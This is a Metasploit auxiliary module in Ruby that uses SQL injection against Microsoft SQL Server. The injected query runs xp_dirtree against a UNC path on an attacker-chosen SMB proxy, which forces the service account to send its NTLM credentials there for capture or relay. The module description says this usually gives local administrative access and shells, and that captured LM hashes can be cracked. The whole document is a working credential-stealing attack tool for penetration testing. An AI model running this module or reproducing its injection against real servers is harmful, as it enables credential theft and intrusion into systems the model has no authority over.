##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::MSSQL_SQLI

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Microsoft SQL Server SQLi NTLM Stealer',
        'Description' => %q{
          This module can be used to help capture or relay the LM/NTLM credentials of the
          account running the remote SQL Server service. The module will use the SQL
          injection from GET_PATH to connect to the target SQL Server instance and execute
          the native "xp_dirtree" or stored procedure.   The stored procedures will then
          force the service account to authenticate to the system defined in the SMBProxy
          option. In order for the attack to be successful, the SMB capture or relay module
          must be running on the system defined as the SMBProxy. The database account used to
          connect to the database should only require the "PUBLIC" role to execute.
          Successful execution of this attack usually results in local administrative access
          to the Windows system.  Specifically, this works great for relaying credentials
          between two SQL Servers using a shared service account to get shells.  However, if
          the relay fails, then the LM hash can be reversed using the Halflm rainbow tables
          and john the ripper.
        },
        'Author' => [
          'nullbind <scott.sutherland[at]netspi.com>',
          'Antti <antti.rantasaari[at]netspi.com>'
        ],
        'License' => MSF_LICENSE,
        'References' => [[ 'URL', 'https://en.wikipedia.org/wiki/SMBRelay' ]],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('SMBPROXY', [ true, 'IP of SMB proxy or sniffer.', '0.0.0.0']),
      ]
    )
  end

  def run
    # Reminder
    print_status('DONT FORGET to run a SMB capture or relay module!')

    # Generate random file name
    rand_filename = Rex::Text.rand_text_alpha(8, '')

    # Setup query - double escaping backslashes
    sql = "exec master..xp_dirtree '\\\\\\\\#{datastore['SMBPROXY']}\\#{rand_filename}'"
    print_status("Attempting to force backend DB to authenticate to the #{datastore['SMBPROXY']}")

    # Execute query to force authentication from backend database to smbproxy
    mssql_query(sql)
  end
end
